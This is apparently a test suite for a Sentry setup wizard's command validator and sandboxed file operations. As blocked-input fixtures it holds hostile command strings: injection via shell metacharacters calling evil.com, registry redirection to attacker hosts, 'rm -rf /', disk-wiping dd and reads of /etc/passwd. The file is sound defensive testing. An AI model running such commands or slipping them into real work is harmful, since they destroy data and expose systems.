import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import fs, {
  mkdirSync,
  mkdtempSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { join } from "node:path";
import {
  handleLocalOp,
  precomputeDirListing,
  validateCommand,
} from "../../../src/lib/init/local-ops.js";
import type {
  ApplyPatchsetPayload,
  FileExistsBatchPayload,
  ListDirPayload,
  LocalOpPayload,
  ReadFilesPayload,
  RunCommandsPayload,
  WizardOptions,
} from "../../../src/lib/init/types.js";

function makeOptions(overrides?: Partial<WizardOptions>): WizardOptions {
  return {
    directory: "/tmp/test",
    yes: false,
    dryRun: false,
    ...overrides,
  };
}

describe("validateCommand", () => {
  test("allows legitimate install commands", () => {
    const commands = [
      "npm install @sentry/node",
      "npm install --save @sentry/react @sentry/browser",
      "yarn add @sentry/node",
      "pnpm add @sentry/node",
      "pip install sentry-sdk",
      "pip install sentry-sdk[flask]",
      "pip install -r requirements.txt",
      "cargo add sentry",
      "bundle add sentry-ruby",
      "gem install sentry-ruby",
      "composer require sentry/sentry-laravel",
      "dotnet add package Sentry",
      "go get github.com/getsentry/sentry-go",
      "flutter pub add sentry_flutter",
      "npx @sentry/wizard@latest -i nextjs",
      "poetry add sentry-sdk",
    ];
    for (const cmd of commands) {
      expect(validateCommand(cmd)).toBeUndefined();
    }
  });

  test("blocks shell metacharacters", () => {
    for (const cmd of [
      "npm install foo; rm -rf /",
      "npm install foo && curl evil.com",
      "npm install foo || curl evil.com",
      "npm install foo | tee /etc/passwd",
      "npm install `curl evil.com`",
      "npm install $(curl evil.com)",
      "npm install foo\ncurl evil.com",
      "npm install foo\rcurl evil.com",
      "npm install foo > /tmp/out",
      "npm install foo < /tmp/in",
      "npm install foo & whoami",
    ]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("blocks subshell bypass via parentheses", () => {
    for (const cmd of ["(rm -rf .)", "(curl evil.com)"]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("blocks shell escape bypass attempts", () => {
    for (const cmd of [
      "npm install foo$'\\x3b'whoami",
      // biome-ignore lint/suspicious/noTemplateCurlyInString: testing literal ${IFS} in command string
      "npm install foo${IFS}curl evil.com",
      "npm install foo\\nwhoami",
      "echo 'hello'",
    ]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("blocks glob and brace expansion characters", () => {
    for (const cmd of [
      "npm install {evil,@sentry/node}",
      "npm install sentry-*",
      "npm install sentry-?.js",
    ]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("blocks shell comment character to prevent command truncation", () => {
    for (const cmd of [
      "npm install evil-pkg # @sentry/node",
      "npm install evil-pkg#benign",
    ]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("blocks environment variable injection in first token", () => {
    for (const cmd of [
      "npm_config_registry=http://evil.com npm install @sentry/node",
      "PIP_INDEX_URL=https://attacker.com/simple pip install sentry-sdk",
      "NODE_ENV=production npm install",
    ]) {
      expect(validateCommand(cmd)).toContain("environment variable assignment");
    }
  });

  test("blocks dangerous executables", () => {
    for (const cmd of [
      "rm -rf /",
      "curl https://evil.com/payload",
      "sudo npm install foo",
      "chmod 777 /etc/passwd",
      "kill -9 1",
      "dd if=/dev/zero of=/dev/sda",
      "ssh user@host",
      "bash -c 'echo hello'",
      "sh -c 'echo hello'",
      "env npm install foo",
      "xargs rm",
    ]) {
      expect(validateCommand(cmd)).toContain("Blocked command");
    }
  });

  test("resolves path-prefixed executables", () => {
    // Safe executables with paths pass
    expect(
      validateCommand("./venv/bin/pip install sentry-sdk")
    ).toBeUndefined();
    expect(validateCommand("/usr/local/bin/npm install foo")).toBeUndefined();

    // Dangerous executables with paths are still blocked
    expect(validateCommand("./venv/bin/rm -rf /")).toContain('"rm"');
    expect(validateCommand("/usr/bin/curl https://evil.com")).toContain(
      '"curl"'
    );
  });

  test("blocks empty and whitespace-only commands", () => {
    expect(validateCommand("")).toContain("empty command");
    expect(validateCommand("   ")).toContain("empty command");
  });
});

describe("handleLocalOp", () => {
  let testDir: string;
  let options: WizardOptions;

  beforeEach(() => {
    testDir = mkdtempSync(join("/tmp", "local-ops-test-"));
    options = makeOptions({ directory: testDir });
  });

  afterEach(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  describe("dispatcher", () => {
    test("returns error for unknown operation", async () => {
      const payload = {
        type: "local-op",
        operation: "teleport",
        cwd: testDir,
        params: {},
      } as unknown as LocalOpPayload;

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("Unknown operation");
    });
  });

  describe("path traversal protection", () => {
    test("rejects relative path escaping cwd", async () => {
      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: "../../../etc" },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("outside project directory");
    });

    test("rejects absolute path outside cwd in read-files", async () => {
      const payload: ReadFilesPayload = {
        type: "local-op",
        operation: "read-files",
        cwd: testDir,
        params: { paths: ["/etc/passwd"] },
      };

      const result = await handleLocalOp(payload, options);
      // read-files catches errors per-file and returns null
      expect(result.ok).toBe(true);
      const files = (result.data as { files: Record<string, string | null> })
        .files;
      expect(files["/etc/passwd"]).toBeNull();
    });

    test("allows relative path within cwd", async () => {
      mkdirSync(join(testDir, "subdir"));
      writeFileSync(join(testDir, "subdir", "file.txt"), "hello");

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: "subdir" },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
    });
  });

  describe("cwd sandboxing", () => {
    test("rejects cwd outside project directory", async () => {
      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: "/",
        params: { path: "." },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("outside project directory");
    });

    test("allows cwd equal to project directory", async () => {
      writeFileSync(join(testDir, "file.txt"), "x");

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: "." },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
    });

    test("allows cwd that is a subdirectory of project directory", async () => {
      mkdirSync(join(testDir, "sub"));
      writeFileSync(join(testDir, "sub", "file.txt"), "x");

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: join(testDir, "sub"),
        params: { path: "." },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
    });
  });

  describe("symlink protection", () => {
    test("rejects symlink pointing outside project in read-files", async () => {
      symlinkSync("/etc", join(testDir, "escape-link"));

      const payload: ReadFilesPayload = {
        type: "local-op",
        operation: "read-files",
        cwd: testDir,
        params: { paths: ["escape-link/passwd"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      // read-files catches per-file errors and returns null
      const files = (result.data as { files: Record<string, string | null> })
        .files;
      expect(files["escape-link/passwd"]).toBeNull();
    });

    test("rejects symlink parent directory in apply-patchset create", async () => {
      symlinkSync("/tmp", join(testDir, "link-out"));

      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [
            {
              path: "link-out/evil.txt",
              action: "create",
              patch: "pwned",
            },
          ],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("via symlink");
    });

    test("allows regular files and directories (no false positives)", async () => {
      mkdirSync(join(testDir, "real-dir"));
      writeFileSync(join(testDir, "real-dir", "file.txt"), "safe");

      const payload: ReadFilesPayload = {
        type: "local-op",
        operation: "read-files",
        cwd: testDir,
        params: { paths: ["real-dir/file.txt"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      const files = (result.data as { files: Record<string, string | null> })
        .files;
      expect(files["real-dir/file.txt"]).toBe("safe");
    });
  });

  describe("list-dir", () => {
    test("lists files and directories with correct types", async () => {
      writeFileSync(join(testDir, "file1.txt"), "a");
      writeFileSync(join(testDir, "file2.ts"), "b");
      mkdirSync(join(testDir, "subdir"));

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: "." },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);

      const entries = (
        result.data as {
          entries: Array<{
            name: string;
            type: "file" | "directory";
          }>;
        }
      ).entries;
      expect(entries).toHaveLength(3);

      const names = entries.map((e) => e.name).sort();
      expect(names).toEqual(["file1.txt", "file2.ts", "subdir"]);

      const dir = entries.find((e) => e.name === "subdir");
      expect(dir?.type).toBe("directory");

      const file = entries.find((e) => e.name === "file1.txt");
      expect(file?.type).toBe("file");
    });

    test("respects maxEntries limit", async () => {
      for (let i = 0; i < 10; i++) {
        writeFileSync(join(testDir, `file${i}.txt`), "x");
      }

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: ".", maxEntries: 3 },
      };

      const result = await handleLocalOp(payload, options);
      const entries = (result.data as { entries: Array<{ name: string }> })
        .entries;
      expect(entries).toHaveLength(3);
    });

    test("recursive mode traverses nested directories", async () => {
      mkdirSync(join(testDir, "a"));
      writeFileSync(join(testDir, "a", "nested.txt"), "x");

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: ".", recursive: true, maxDepth: 3 },
      };

      const result = await handleLocalOp(payload, options);
      const entries = (result.data as { entries: Array<{ path: string }> })
        .entries;
      const paths = entries.map((e) => e.path);
      expect(paths).toContain(join("a", "nested.txt"));
    });

    test("skips node_modules and dot-directories when recursing", async () => {
      mkdirSync(join(testDir, "node_modules", "pkg"), { recursive: true });
      writeFileSync(join(testDir, "node_modules", "pkg", "index.js"), "x");
      mkdirSync(join(testDir, ".git", "objects"), { recursive: true });
      writeFileSync(join(testDir, ".git", "objects", "abc"), "x");
      mkdirSync(join(testDir, "src"));
      writeFileSync(join(testDir, "src", "app.ts"), "x");

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: ".", recursive: true, maxDepth: 5 },
      };

      const result = await handleLocalOp(payload, options);
      const entries = (result.data as { entries: Array<{ path: string }> })
        .entries;
      const paths = entries.map((e) => e.path);

      // The top-level dirs are listed but not recursed into
      expect(paths).toContain("node_modules");
      expect(paths).toContain(".git");
      // Their children should NOT be listed
      expect(paths).not.toContain(join("node_modules", "pkg"));
      expect(paths).not.toContain(join(".git", "objects"));
      // src IS recursed into
      expect(paths).toContain(join("src", "app.ts"));
    });

    test("respects maxDepth limit", async () => {
      // Create 3-level deep structure
      mkdirSync(join(testDir, "a", "b", "c"), { recursive: true });
      writeFileSync(join(testDir, "a", "b", "c", "deep.txt"), "x");

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: ".", recursive: true, maxDepth: 1 },
      };

      const result = await handleLocalOp(payload, options);
      const entries = (result.data as { entries: Array<{ path: string }> })
        .entries;
      const paths = entries.map((e) => e.path);

      expect(paths).toContain("a");
      expect(paths).toContain(join("a", "b"));
      // Depth 2+ should not be reached
      expect(paths).not.toContain(join("a", "b", "c"));
    });

    test("excludes symlinks that point outside project directory", async () => {
      writeFileSync(join(testDir, "legit.ts"), "x");
      symlinkSync("/tmp", join(testDir, "escape-link"));

      const payload: ListDirPayload = {
        type: "local-op",
        operation: "list-dir",
        cwd: testDir,
        params: { path: "." },
      };

      const result = await handleLocalOp(payload, options);
      const entries = (result.data as { entries: Array<{ name: string }> })
        .entries;
      const names = entries.map((e) => e.name);

      expect(names).toContain("legit.ts");
      expect(names).not.toContain("escape-link");
    });
  });

  describe("read-files", () => {
    test("reads file contents correctly", async () => {
      writeFileSync(join(testDir, "hello.txt"), "world");

      const payload: ReadFilesPayload = {
        type: "local-op",
        operation: "read-files",
        cwd: testDir,
        params: { paths: ["hello.txt"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      const files = (result.data as { files: Record<string, string | null> })
        .files;
      expect(files["hello.txt"]).toBe("world");
    });

    test("returns null for non-existent files", async () => {
      const payload: ReadFilesPayload = {
        type: "local-op",
        operation: "read-files",
        cwd: testDir,
        params: { paths: ["missing.txt"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      const files = (result.data as { files: Record<string, string | null> })
        .files;
      expect(files["missing.txt"]).toBeNull();
    });

    test("truncates files exceeding maxBytes", async () => {
      const content = "A".repeat(1000);
      writeFileSync(join(testDir, "big.txt"), content);

      const payload: ReadFilesPayload = {
        type: "local-op",
        operation: "read-files",
        cwd: testDir,
        params: { paths: ["big.txt"], maxBytes: 50 },
      };

      const result = await handleLocalOp(payload, options);
      const files = (result.data as { files: Record<string, string | null> })
        .files;
      expect(files["big.txt"]?.length).toBe(50);
    });

    test("handles multiple files in one call", async () => {
      writeFileSync(join(testDir, "a.txt"), "aaa");
      writeFileSync(join(testDir, "b.txt"), "bbb");

      const payload: ReadFilesPayload = {
        type: "local-op",
        operation: "read-files",
        cwd: testDir,
        params: { paths: ["a.txt", "b.txt", "c.txt"] },
      };

      const result = await handleLocalOp(payload, options);
      const files = (result.data as { files: Record<string, string | null> })
        .files;
      expect(files["a.txt"]).toBe("aaa");
      expect(files["b.txt"]).toBe("bbb");
      expect(files["c.txt"]).toBeNull();
    });
  });

  describe("file-exists-batch", () => {
    test("correctly identifies existing and missing files", async () => {
      writeFileSync(join(testDir, "exists.txt"), "yes");

      const payload: FileExistsBatchPayload = {
        type: "local-op",
        operation: "file-exists-batch",
        cwd: testDir,
        params: { paths: ["exists.txt", "nope.txt"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      const exists = (result.data as { exists: Record<string, boolean> })
        .exists;
      expect(exists["exists.txt"]).toBe(true);
      expect(exists["nope.txt"]).toBe(false);
    });

    test("returns false for path traversal attempts", async () => {
      const payload: FileExistsBatchPayload = {
        type: "local-op",
        operation: "file-exists-batch",
        cwd: testDir,
        params: { paths: ["../../etc/passwd"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      const exists = (result.data as { exists: Record<string, boolean> })
        .exists;
      expect(exists["../../etc/passwd"]).toBe(false);
    });
  });

  describe("run-commands", () => {
    test("executes command and captures stdout", async () => {
      const payload: RunCommandsPayload = {
        type: "local-op",
        operation: "run-commands",
        cwd: testDir,
        params: { commands: ["echo hello"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      const results = (
        result.data as {
          results: Array<{
            stdout: string;
            exitCode: number;
          }>;
        }
      ).results;
      expect(results[0].stdout.trim()).toBe("hello");
      expect(results[0].exitCode).toBe(0);
    });

    test("returns error on failed command", async () => {
      const payload: RunCommandsPayload = {
        type: "local-op",
        operation: "run-commands",
        cwd: testDir,
        params: { commands: ["ls /nonexistent_path_that_does_not_exist_xyz"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("failed with exit code");
    });

    test("rejects blocked commands", async () => {
      const payload: RunCommandsPayload = {
        type: "local-op",
        operation: "run-commands",
        cwd: testDir,
        params: { commands: ["rm -rf /"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("Blocked command");
    });

    test("stops on first failed command in a sequence", async () => {
      const payload: RunCommandsPayload = {
        type: "local-op",
        operation: "run-commands",
        cwd: testDir,
        params: { commands: ["false", "echo should_not_run"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      const results = (
        result.data as {
          results: Array<{ command: string }>;
        }
      ).results;
      expect(results).toHaveLength(1);
      expect(results[0].command).toBe("false");
    });

    test("dry-run validates commands but skips execution", async () => {
      const payload: RunCommandsPayload = {
        type: "local-op",
        operation: "run-commands",
        cwd: testDir,
        params: { commands: ["rm -rf /", "echo hello"] },
      };

      const dryRunOptions = makeOptions({ dryRun: true, directory: testDir });
      const result = await handleLocalOp(payload, dryRunOptions);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("Blocked command");
    });

    test("dry-run skips execution for valid commands", async () => {
      const payload: RunCommandsPayload = {
        type: "local-op",
        operation: "run-commands",
        cwd: testDir,
        params: { commands: ["npm install @sentry/node", "echo hello"] },
      };

      const dryRunOptions = makeOptions({ dryRun: true, directory: testDir });
      const result = await handleLocalOp(payload, dryRunOptions);
      expect(result.ok).toBe(true);
      const results = (
        result.data as {
          results: Array<{ stdout: string; exitCode: number }>;
        }
      ).results;
      expect(results).toHaveLength(2);
      expect(results[0].stdout).toBe("(dry-run: skipped)");
      expect(results[0].exitCode).toBe(0);
    });

    test("rejects entire batch if any command fails validation", async () => {
      const payload: RunCommandsPayload = {
        type: "local-op",
        operation: "run-commands",
        cwd: testDir,
        params: { commands: ["echo hello", "rm -rf /"] },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("Blocked command");
      // No commands should have executed (no data.results)
      expect(result.data).toBeUndefined();
    });
  });

  describe("apply-patchset", () => {
    test("creates a new file with content", async () => {
      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [
            { path: "new.txt", action: "create", patch: "hello world" },
          ],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      expect(fs.readFileSync(join(testDir, "new.txt"), "utf-8")).toBe(
        "hello world"
      );
    });

    test("creates nested directories automatically", async () => {
      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [
            {
              path: "deep/nested/file.txt",
              action: "create",
              patch: "content",
            },
          ],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      expect(
        fs.readFileSync(join(testDir, "deep", "nested", "file.txt"), "utf-8")
      ).toBe("content");
    });

    test("modifies an existing file", async () => {
      writeFileSync(join(testDir, "existing.txt"), "old");

      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [
            { path: "existing.txt", action: "modify", patch: "new content" },
          ],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      expect(fs.readFileSync(join(testDir, "existing.txt"), "utf-8")).toBe(
        "new content"
      );
    });

    test("fails when modifying a non-existent file", async () => {
      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [{ path: "ghost.txt", action: "modify", patch: "content" }],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("file does not exist");
    });

    test("deletes an existing file", async () => {
      writeFileSync(join(testDir, "doomed.txt"), "bye");

      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [{ path: "doomed.txt", action: "delete", patch: "" }],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
      expect(fs.existsSync(join(testDir, "doomed.txt"))).toBe(false);
    });

    test("delete is a no-op for non-existent file", async () => {
      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [{ path: "ghost.txt", action: "delete", patch: "" }],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);
    });

    test("applies multiple patches in sequence", async () => {
      writeFileSync(join(testDir, "to-modify.txt"), "old");
      writeFileSync(join(testDir, "to-delete.txt"), "bye");

      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [
            { path: "created.txt", action: "create", patch: "new" },
            { path: "to-modify.txt", action: "modify", patch: "updated" },
            { path: "to-delete.txt", action: "delete", patch: "" },
          ],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(true);

      const applied = (
        result.data as { applied: Array<{ path: string; action: string }> }
      ).applied;
      expect(applied).toHaveLength(3);

      expect(fs.existsSync(join(testDir, "created.txt"))).toBe(true);
      expect(fs.readFileSync(join(testDir, "to-modify.txt"), "utf-8")).toBe(
        "updated"
      );
      expect(fs.existsSync(join(testDir, "to-delete.txt"))).toBe(false);
    });

    test("dry-run does not write files but reports actions", async () => {
      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [
            { path: "phantom.txt", action: "create", patch: "content" },
          ],
        },
      };

      const dryRunOptions = makeOptions({ dryRun: true, directory: testDir });
      const result = await handleLocalOp(payload, dryRunOptions);
      expect(result.ok).toBe(true);

      const applied = (
        result.data as { applied: Array<{ path: string; action: string }> }
      ).applied;
      expect(applied).toHaveLength(1);
      expect(applied[0].action).toBe("create");

      // File should NOT exist on disk
      expect(fs.existsSync(join(testDir, "phantom.txt"))).toBe(false);
    });

    test("rejects entire patchset if any path is unsafe (no partial writes)", async () => {
      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [
            { path: "safe.txt", action: "create", patch: "good content" },
            { path: "../../evil.txt", action: "create", patch: "bad" },
          ],
        },
      };

      const result = await handleLocalOp(payload, options);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("outside project directory");

      // First patch must NOT have been written
      expect(fs.existsSync(join(testDir, "safe.txt"))).toBe(false);
    });

    test("dry-run still validates path safety", async () => {
      const payload: ApplyPatchsetPayload = {
        type: "local-op",
        operation: "apply-patchset",
        cwd: testDir,
        params: {
          patches: [{ path: "../../evil.txt", action: "create", patch: "bad" }],
        },
      };

      const dryRunOptions = makeOptions({ dryRun: true, directory: testDir });
      const result = await handleLocalOp(payload, dryRunOptions);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("outside project directory");
    });
  });
});

describe("precomputeDirListing", () => {
  let testDir: string;

  beforeEach(() => {
    testDir = mkdtempSync(join("/tmp", "precompute-test-"));
  });

  afterEach(() => {
    rmSync(testDir, { recursive: true, force: true });
  });

  test("returns DirEntry[] directly", async () => {
    writeFileSync(join(testDir, "app.ts"), "x");
    mkdirSync(join(testDir, "src"));

    const entries = await precomputeDirListing(testDir);

    expect(Array.isArray(entries)).toBe(true);
    expect(entries.length).toBeGreaterThanOrEqual(2);

    const names = entries.map((e) => e.name).sort();
    expect(names).toContain("app.ts");
    expect(names).toContain("src");

    const file = entries.find((e) => e.name === "app.ts");
    expect(file?.type).toBe("file");

    const dir = entries.find((e) => e.name === "src");
    expect(dir?.type).toBe("directory");
  });

  test("returns empty array for non-existent directory", async () => {
    const entries = await precomputeDirListing(join(testDir, "nope"));
    expect(entries).toEqual([]);
  });

  test("recursively lists nested entries", async () => {
    mkdirSync(join(testDir, "a"));
    writeFileSync(join(testDir, "a", "nested.ts"), "x");

    const entries = await precomputeDirListing(testDir);
    const paths = entries.map((e) => e.path);
    expect(paths).toContain(join("a", "nested.ts"));
  });
});
